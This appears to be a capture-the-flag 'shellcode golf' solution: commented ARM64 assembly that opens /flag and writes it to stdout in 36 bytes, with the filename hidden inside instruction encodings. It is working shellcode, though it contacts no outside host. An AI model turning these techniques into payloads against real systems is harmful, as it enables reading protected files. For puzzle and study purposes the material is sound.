// Shellcode Golf — ARM64 Linux, 36 bytes
// Opens /flag via openat, sends to stdout via sendfile.
//
// Key trick: "/flag\0" is embedded across the last two instructions:
//   ldnp d0, d11, [x24, #-0x1a0]  → bytes [00 2F 66 6C] contain "/fl"
//   svc #827                       → bytes [61 67 00 D4] contain "ag\0"
// The ldnp is a harmless SIMD load (only touches vector regs).
// The svc immediate is ignored by the kernel (syscall nr comes from x8).
//
// Entry state from scloader's cache_flush:
//   x1 = base + size (pointer past shellcode end)
//   x2 = 32 (cache line size — reused as O_RDONLY=0 after zeroing)
//   x3 = 32 (sendfile count)
//   x6 = 64

.section .text
.global _start
_start:
    sub  x1, x1, #7        // x1 = &"/flag" (byte 29 of shellcode)
    mov  x2, xzr            // O_RDONLY flags + sendfile offset=NULL
    mov  x8, #56            // openat
    svc  #0                  // openat(x0, "/flag", 0) → fd

    mov  x1, x0             // in_fd = fd
    mov  x0, #1             // out_fd = stdout
    mov  x8, #71            // sendfile

    // --- "/flag\0" embedded in these two instructions ---
    ldnp d0, d11, [x24, #-0x1a0]   // [00 2F 66 6C] = harmless SIMD load
    svc  #827                        // [61 67 00 D4] = sendfile(1, fd, NULL, 32)
